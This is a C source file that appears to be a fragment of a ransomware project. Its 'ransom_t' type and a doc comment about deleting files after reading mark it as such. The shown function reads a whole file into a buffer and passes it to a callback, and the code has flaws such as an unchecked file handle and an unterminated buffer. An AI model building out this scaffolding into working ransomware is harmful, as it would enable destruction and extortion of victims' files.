#include "fournights.h"
/**
  * read_file - reads lines from a file, and executes a function on them.
 (* TODO: Function pointer is of type char **;
 (*       NOT MODULAR.
 (*       Build a helper function to set
 (*       the right return type?
  * Deletes the file afterwards
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on lines
  * Return: number of bytes read
 **/
size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *ransom))
{
	/*
	int read = 0;
	*/
	size_t bytes_read = 0;
	FILE *fp = NULL;
	char *buf = NULL;

	if (!filepath || !ransom)
		return(0);
	fp = fopen(filepath, "rb");
	fseek(fp, 0, SEEK_END);
	bytes_read = ftell(fp);
	printf("filesize: %d\n", (int)bytes_read);
	if(bytes_read == 0)
	{
		fclose(fp);
		return(0);
	}
	rewind(fp);
	buf = (char *)malloc((bytes_read + 1) * sizeof(char));
	fread(buf, bytes_read, sizeof(char), fp);
	printf("orig: %s\n", buf);
	if(fxn)
		fxn(buf, ransom);
	/*
	printf("base64: %s\n", base64encode(buf, read));
	*/
	/*
	while((read = getline(&buf, &bytes_read, fp)) > 0)
	{
		printf("%s", buf);
		if (fxn && read > 2)
		{
			buf[read] = '\0';
			fxn(buf, ransom);
		}
		else
			printf("base64: %s\n", base64encode(buf, read));
	}
	*/

	free(buf);
	fclose(fp);
	/* unlink(filepath); */
	return (bytes_read);
}

/**
  * read_file - reads lines from a file, and executes a function on them.
 (* TODO: Function pointer is of type char **;
 (*       NOT MODULAR.
 (*       Build a helper function to set
 (*       the right return type?
  * Deletes the file afterwards
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on lines
  * Return: number of bytes read
char write_file(const char *filepath, ransom_t *ransom, char **(*fxn)(char *, ransom_t *ransom))
{

}
 **/
